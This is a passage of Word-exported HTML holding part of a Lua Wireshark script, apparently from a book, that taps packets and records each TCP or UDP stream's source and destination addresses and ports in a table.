style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--{ STREAMIDX:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:177.7500pt;margin-left:40.0500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=58  valign=top  style="width:34.9000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=48  valign=top  style="width:28.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:10.7000pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >{</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=190  valign=top  style="width:114.0500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=58  valign=top  style="width:34.9000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=48  valign=top  style="width:28.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=190  valign=top  style="width:114.0500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:10.7500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >SRCIP: srcip,</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=58  valign=top  style="width:34.9000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=48  valign=top  style="width:28.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=190  valign=top  style="width:114.0500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:10.7500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >DSTIP: dstip,</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=58  valign=top  style="width:34.9000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=48  valign=top  style="width:28.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=190  valign=top  style="width:114.0500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:10.7500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >SRCP: srcport,</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=58  valign=top  style="width:34.9000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=48  valign=top  style="width:28.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=190  valign=top  style="width:114.0500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:10.7500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >DSTP: dstport,</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=58  valign=top  style="width:34.9000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=48  valign=top  style="width:28.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=190  valign=top  style="width:114.0500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:10.7500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP: bool</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=58  valign=top  style="width:34.9000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=48  valign=top  style="width:28.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:10.7000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="font-family:'Courier New';font-size:12.0000pt;" >}</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=190  valign=top  style="width:114.0500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=58  valign=top  style="width:34.9000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--}</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=48  valign=top  style="width:28.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=190  valign=top  style="width:114.0500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr></table><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:10.8500pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >streams = {}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.5000pt;margin-right:17.2500pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create our function to run that creates the listener local function init_listener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create our listener with no filter so we get all</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section306" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >frames</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local tap = Listener.new(nil, nil)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--called for every packet</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:117.0500pt;margin-left:36.7500pt;text-indent:-28.8000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >function tap.packet(pinfo, tvb, root) local tcpstream = tcp_stream()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:266.2500pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local udp = udp() local ip = ip()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark591" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if tcpstream then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--if we have already processed this stream then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section307" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >return</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:100.7000pt;margin-left:36.7500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if streams[tostring(tcpstream)] then return</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section308" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:115.1000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--calling tostring as we assume if there is a tcp stream we have an ip header</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ipsrc = tostring(ip_src()) local ipdst = tostring(ip_dst())</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:114.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local tcpsrc = tostring(tcp_src()) local tcpdst = tostring(tcp_dst())</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-<a name="_bookmark592" ></a>-build out the stream info table local streaminfo = {} streaminfo["ipsrc"] = ipsrc streaminfo["ipdst"] = ipdst streaminfo["psrc"] = tcpsrc streaminfo["pdst"] = tcpdst streaminfo["istcp"] = true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >streams[tostring(tcpstream)] = streaminfo</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if udp and ip then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:115.1000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--calling tostring as we assume if there is a tcp stream we have an ip header</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  